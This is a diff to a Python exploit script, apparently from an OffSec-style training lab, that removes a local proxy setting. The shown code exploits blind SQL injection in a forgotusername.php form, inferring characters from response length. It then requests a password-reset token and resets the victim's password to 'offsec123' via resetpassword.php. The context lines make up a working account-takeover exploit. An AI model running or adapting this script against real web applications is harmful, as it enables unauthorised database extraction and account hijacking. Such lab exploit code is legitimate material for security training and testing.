@@ -6,10 +6,6 @@ import requests, argparse, sys
 parser = argparse.ArgumentParser()
 parser.add_argument('-t','--target', help='Target URL', required=True)
 args = parser.parse_args()
-http_proxy = "http://127.0.0.1:8080"
-proxyDict = {
-            "http" : http_proxy
-        }
 
 def forgot_username_sqli(target, inj_str):
 
@@ -18,7 +14,7 @@ def forgot_username_sqli(target, inj_str):
         url = "http://%s/forgotusername.php" %target
         headers = {"Content-Type": "application/x-www-form-urlencoded"}
         data = "username=%s" %inj_str.replace("[CHAR]", str(j))
-        r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
+        r = requests.post(url, headers=headers, data=data)
         content_length = int(r.headers['Content-Length'])
         if (content_length < 1480):
             return j
@@ -46,7 +42,7 @@ def request_token(target, username):
     url = "http://%s/forgotpassword.php" %target
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     data = "username=%s" %username
-    r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
+    r = requests.post(url, headers=headers, data=data)
     return
 
 def reset_password(target, token):
@@ -54,7 +50,7 @@ def reset_password(target, token):
     url = "http://%s/resetpassword.php" %target
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
     data = "token=%s&password1=offsec123&password2=offsec123" %token
-    r = requests.post(url, headers=headers, data=data, proxies=proxyDict)
+    r = requests.post(url, headers=headers, data=data)
     if "Password changed!" in r.text:
         print("[+] Password change successful")
     else:
